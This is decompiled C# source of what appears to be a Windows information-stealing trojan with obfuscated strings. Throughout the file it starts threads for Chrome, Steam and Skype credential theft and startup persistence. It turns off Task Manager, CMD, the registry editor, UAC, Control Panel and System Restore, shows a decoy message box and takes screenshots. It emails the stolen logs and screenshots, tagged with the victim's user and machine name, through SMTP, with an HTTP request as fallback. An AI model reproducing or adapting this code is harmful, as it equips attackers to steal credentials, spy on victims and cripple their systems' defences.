using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using My;

public class CCUKM
{
	public static string SWGJOJFO;

	public static string QECQVQLF;

	public static string MYTKMORB;

	public static string QWJDLTJK;

	public static string SLSNFHDY;

	public static string HPIVIUFI;

	public static string CMLPBIEI;

	public static string TQYUOPFW;

	public static string IPPTSRTH;

	public static string ONOHKJYN;

	public static string KDPRLLJR;

	public static string OMBKEQEF;

	public static string GCWCMSTU;

	public static string OGVCL = "";

	public static string HTWUF = TGKKN.HOGCW("jaqysp2Ao6i8r1Jog7GpfqGveJ+MpSs=", "False");

	public static string FYMBL = TGKKN.HOGCW("f5uzuGtNaXV9cCs=", "False");

	public static string DBEKF = TGKKN.HOGCW("kqe5vGyGp6a1qk2dtLkr", "False");

	public static int YVOSE = 587;

	public static string DSABLETaskManager = TGKKN.HOGCW("USERTASK", "False");

	public static string DSABLEdCMD = TGKKN.HOGCW("USERCMD", "False");

	public static string DSABLERegistry = TGKKN.HOGCW("USERREG", "False");

	public static string DSABLEUAC = TGKKN.HOGCW("USERUAC", "False");

	public static string DSABLEFolderOptions = TGKKN.HOGCW("USERFOLDER", "False");

	public static string DSABLEControlPanel = TGKKN.HOGCW("USERCONTROL", "False");

	public static string DSABLESystemRestore = TGKKN.HOGCW("USERRESTORE", "False");

	public static string HBUTT = TGKKN.HOGCW("DLEXSite", "False");

	public static string ILOUO = TGKKN.HOGCW("hay3unZMZys=", "False");

	public static string FFJOJ = TGKKN.HOGCW("Kw==", "False");

	public static string NLOCO = TGKKN.HOGCW("Yam0uK1WV3LBa0xne4FsTCs=", "False");

	public static string FYXYVKUY = TGKKN.HOGCW("daKyr6yVrGSeopCvra6ikVmnurKKnWS5rJJZsLqeglmRnoBRa3KPiWpnZCs=", "False");

	public static string HFRBJRDD = TGKKN.HOGCW("e7TCuSM=", "False");

	public static string HKOIIUIK = TGKKN.HOGCW("bmC3u6+KYK27q0WCt7OnkGCuwaeQsyM=", "False");

	public static int KVKSQKXQ = 3000000;

	public static string NGOSLWHR = "";

	public static string WHJBIYTO = "";

	public static int number = 0;

	public static HYURL QSBLK;

	public static Thread DQJDF = new Thread(WQLRC);

	public static Thread GCThread = new Thread(DAChrome.GTCHRME);

	public static Thread CLYOM = new Thread(TRMEG);

	public static Thread STRTTHRD = new Thread(DAStartup.Startupdll.StartPers);

	public static Thread FRCSTMLGINThread = new Thread(DASteam.FRCSTMLGINdll.Mainz);

	public static Thread SkypeSPEDThread = new Thread(DASkypeSPED.SkypeSPEDll.GTSKPE);

	[STAThread]
	public static void Main()
	{
		//IL_023e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0270: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0306: Unknown result type (might be due to invalid IL or missing references)
		//IL_0338: Unknown result type (might be due to invalid IL or missing references)
		//IL_036a: Unknown result type (might be due to invalid IL or missing references)
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f4: Unknown result type (might be due to invalid IL or missing references)
		int num = default(int);
		try
		{
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			STRTTHRD.IsBackground = true;
			STRTTHRD.Start();
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			num = 1;
			try
			{
				if (num2 == 3)
				{
					Application.Restart();
				}
				QSBLK = new HYURL(WHJBIYTO);
				HYURL.SHJLX();
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5, num);
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
		try
		{
			DQJDF.IsBackground = true;
			DQJDF.Start();
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			string fFJOJ = FFJOJ;
			if (Operators.CompareString(fFJOJ, TGKKN.HOGCW("ltLc2gI=", "False"), false) == 0)
			{
				MessageBox.Show(FYXYVKUY, NLOCO, (MessageBoxButtons)0, (MessageBoxIcon)0);
			}
			else if (Operators.CompareString(fFJOJ, TGKKN.HOGCW("h6zIy7ieshg=", "False"), false) == 0)
			{
				MessageBox.Show(FYXYVKUY, NLOCO, (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else if (Operators.CompareString(fFJOJ, TGKKN.HOGCW("c8G3x66bqsjEvJwZ", "False"), false) == 0)
			{
				MessageBox.Show(FYXYVKUY, NLOCO, (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else if (Operators.CompareString(fFJOJ, TGKKN.HOGCW("bqqwuC8=", "False"), false) == 0)
			{
				MessageBox.Show(FYXYVKUY, NLOCO, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(fFJOJ, TGKKN.HOGCW("W6Ousqcw", "False"), false) == 0)
			{
				MessageBox.Show(FYXYVKUY, NLOCO, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(fFJOJ, TGKKN.HOGCW("kdDL4NOpytQJ", "False"), false) == 0)
			{
				MessageBox.Show(FYXYVKUY, NLOCO, (MessageBoxButtons)0, (MessageBoxIcon)32);
			}
			else if (Operators.CompareString(fFJOJ, TGKKN.HOGCW("cKS8uSI=", "False"), false) == 0)
			{
				MessageBox.Show(FYXYVKUY, NLOCO, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(fFJOJ, TGKKN.HOGCW("h9Tg2Nev1NcD", "False"), false) == 0)
			{
				MessageBox.Show(FYXYVKUY, NLOCO, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else if (Operators.CompareString(fFJOJ, TGKKN.HOGCW("b6+ywreTosC8tJQh", "False"), false) == 0)
			{
				MessageBox.Show(FYXYVKUY, NLOCO, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else
			{
				MessageBox.Show(TGKKN.HOGCW("mc3V39K7zYq21bbO3JGyp8Lf48iojYrBz6nA3daDq86K5dJkx97l036Omd7Mp9HZ5NKq05jU0rF/0ODVZMzZ48hkx8/d03ID", "False"), TGKKN.HOGCW("i7/H0cStv3yox6jAzhM=", "False"), (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			GCThread.IsBackground = true;
			GCThread.Start();
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("mYbQ08qiu9XLwrG0z8vPscTS0cWrCg==", "False"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("gIyztLWTsrm3t4CBq7Suma+9ra+Fsr69sououCU=", "False"), overwrite: true);
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(DSABLETaskManager, TGKKN.HOGCW("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue(TGKKN.HOGCW("cY+Ur6dsmaGojXeYrqubbparqbePuMa3uo6gnL+rm7PCxa6doKa/to2zxsmkbLnByK2XuKW7upytvsSkebO7v6uSqcKym6K3w7u1HQ==", "False"), TGKKN.HOGCW("hcXaz8KtwbvP06ypzuAJ", "False"), (object)TGKKN.HOGCW("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(DSABLEdCMD, TGKKN.HOGCW("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue(TGKKN.HOGCW("ZoSJpJxhjpadgmyNo6CQY4ugnqyErbusr4OVlLqph5ytsLB6hq2ur42ss7GxepCtuaGNsLenkJesuLCqKA==", "False"), TGKKN.HOGCW("c7PIvbCbr5ipkhc=", "False"), (object)TGKKN.HOGCW("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(DSABLERegistry, TGKKN.HOGCW("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue(TGKKN.HOGCW("h6Wqxb2Cr7e+o42uxMGxhKzBv82lztzN0KS2stXBscnY28SztrzVzKPJ3N+6gs/X3sOtzrvR0LLD1Nq6j8nR1cGov9jIsbjN2dHLBw==", "False"), TGKKN.HOGCW("a6vAtaiTp5+5rZC1wca/e7G8wLkf", "False"), (object)TGKKN.HOGCW("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(DSABLEUAC, TGKKN.HOGCW("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(TGKKN.HOGCW("ipzJy8+1xtzr2aO15ufarM+gpsKqz9Giy7/HjaPRZ4fk3dSry9+Zwprb4OjLtJWf0NisyZvZ3qyCrriqZ6q4wLOjtby6up6jv7nClMvQ5tW60dPowp7L29jVvtXJt9u51NLi2p3H3+fPttDJxNWzy9Ddy7q+wO3Zu8falJW9grLix6nO0sC7iIKc6IaZp7TTqp6xv7iGdsaNpIZ2yAE=", "False"), (AppWinStyle)0, false, -1);
			}
			if (Operators.CompareString(DSABLEFolderOptions, TGKKN.HOGCW("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(TGKKN.HOGCW("cH6La56CnWSTiGGOoJ6shK27rK+DlZG0oJCot7qjkpWbtKuCqLu+mWGutr2ijK2asK+RorO5mW6osLSgh563p4KWqbC6r4OrZHqzPoezkayKnam9jI6trbqrkVlzv11wfouqgXWIlo9dTZ1kfF1Nnyo=", "False"), (AppWinStyle)2, false, -1);
			}
			if (Operators.CompareString(DSABLEControlPanel, TGKKN.HOGCW("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(TGKKN.HOGCW("a3mGZpl9mF+Og1yJm5mnf6i2p6p+kIyvm4ujsrWejZCWr6Z9o7a5lFypsbidh6iVq6qMna60lGmjq6+bgpmyon2RpKu1qn6mX3WuOYKuiaeHqLG1pGmVraukOWOzZopee56Kj2iGg2ZnfVRwZmd/Lg==", "False"), (AppWinStyle)0, false, -1);
			}
			if (Operators.CompareString(DSABLESystemRestore, TGKKN.HOGCW("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue(TGKKN.HOGCW("h6Wqxb2Lqaitqp6npq+miKiqyLGOoLnDn5GfwbnHoszU382lzsHDx62+1OPRX6i5yKG0zNfRzLOwyt7RqMnTyLG4zdnRy5G/2ODNsb8J", "False"), TGKKN.HOGCW("jc3i18q1ycLIAQ==", "False"), (object)TGKKN.HOGCW("TCw=", "False"), RegistryValueKind.DWord);
			}
		}
		catch (Exception ex10)
		{
			ProjectData.SetProjectError(ex10, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			FRCSTMLGINThread.IsBackground = true;
			FRCSTMLGINThread.Start();
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			SkypeSPEDThread.IsBackground = true;
			SkypeSPEDThread.Start();
		}
		catch (Exception ex12)
		{
			ProjectData.SetProjectError(ex12, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			CLYOM.IsBackground = true;
			CLYOM.Start();
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			double NENYO = 45.0;
			PHNUVDOK(ref NENYO);
			Application.Exit();
		}
		catch (Exception ex14)
		{
			ProjectData.SetProjectError(ex14, num);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void PHNUVDOK(ref double NENYO)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(NENYO);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void WQLRC()
	{
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Expected O, but got Unknown
		string text = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(KVKSQKXQ);
				text = "";
				string text2 = "";
				double NENYO = 0.2;
				PHNUVDOK(ref NENYO);
				try
				{
					WebClient webClient = new WebClient();
					text2 = TGKKN.HOGCW("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(TGKKN.HOGCW("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + TGKKN.HOGCW("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				NENYO = 1.0;
				PHNUVDOK(ref NENYO);
				try
				{
					if (Operators.CompareString(HFRBJRDD, TGKKN.HOGCW("mNHf1gY=", "False"), false) == 0)
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
						Bitmap val3 = val;
						((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + TGKKN.HOGCW("ZsPMzBI=", "False"));
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				NENYO = 0.3;
				PHNUVDOK(ref NENYO);
				try
				{
					if (Operators.CompareString(WHJBIYTO, "", false) != 0)
					{
						NGOSLWHR = TGKKN.HOGCW("fHiEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYSLYG2rrsFgXnmEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYWrKQ==", "False") + Environment.NewLine + Environment.NewLine + WHJBIYTO + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						try
						{
							MailMessage mailMessage = new MailMessage();
							MailMessage mailMessage2 = mailMessage;
							mailMessage2.From = new MailAddress(HTWUF);
							mailMessage2.To.Add(HTWUF);
							mailMessage2.Subject = TGKKN.HOGCW("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + TGKKN.HOGCW("aQ0=", "False") + Environment.MachineName.ToString();
							mailMessage2.Body = NGOSLWHR;
							try
							{
								if (Operators.CompareString(HFRBJRDD, TGKKN.HOGCW("mNHf1gY=", "False"), false) == 0)
								{
									Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + TGKKN.HOGCW("ZsPMzBI=", "False"));
									mailMessage2.Attachments.Add(item);
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							mailMessage2 = null;
							SmtpClient smtpClient = new SmtpClient(DBEKF);
							SmtpClient smtpClient2 = smtpClient;
							smtpClient2.Port = YVOSE;
							smtpClient2.EnableSsl = true;
							smtpClient2.Credentials = new NetworkCredential(HTWUF, FYMBL);
							smtpClient2.Send(mailMessage);
							smtpClient2 = null;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							try
							{
								string text3 = TGKKN.HOGCW("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
								_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + HTWUF + "&subject=" + Strings.Replace(TGKKN.HOGCW("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + TGKKN.HOGCW("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(NGOSLWHR, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + HTWUF).GetResponse();
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				NGOSLWHR = "";
				WHJBIYTO = "";
				OGVCL = "";
				number++;
			}
		}
	}

	public static void TRMEG()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("eoatrq+NrLOxsXp7pa6ok6m3pyw=", TGKKN.HOGCW("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TGKKN.HOGCW("eoatrq+NrLOxsXp7pa6ok6m3pyw=", TGKKN.HOGCW("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			double NENYO = 25.0;
			PHNUVDOK(ref NENYO);
			string text = TGKKN.HOGCW("lZGdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3krPbvpvBxdnMd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ4sg4=", "False") + Environment.NewLine + Environment.NewLine + SWGJOJFO + Environment.NewLine + Environment.NewLine + QECQVQLF + Environment.NewLine + Environment.NewLine + MYTKMORB + Environment.NewLine + Environment.NewLine + QWJDLTJK + Environment.NewLine + Environment.NewLine + SLSNFHDY + Environment.NewLine + Environment.NewLine + HPIVIUFI + Environment.NewLine + Environment.NewLine + CMLPBIEI + Environment.NewLine + Environment.NewLine + TQYUOPFW + Environment.NewLine + Environment.NewLine + ONOHKJYN + Environment.NewLine + Environment.NewLine + KDPRLLJR + Environment.NewLine + Environment.NewLine + OMBKEQEF + Environment.NewLine + Environment.NewLine + GCWCMSTU + Environment.NewLine + Environment.NewLine + TGKKN.HOGCW("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(HTWUF);
				mailMessage2.To.Add(HTWUF);
				mailMessage2.Subject = TGKKN.HOGCW("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + TGKKN.HOGCW("aQ0=", TGKKN.HOGCW("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(DBEKF);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = YVOSE;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(HTWUF, FYMBL);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = TGKKN.HOGCW("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + HTWUF + "&subject=" + Strings.Replace(TGKKN.HOGCW("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + TGKKN.HOGCW("aQ0=", TGKKN.HOGCW("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + HTWUF).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}
}
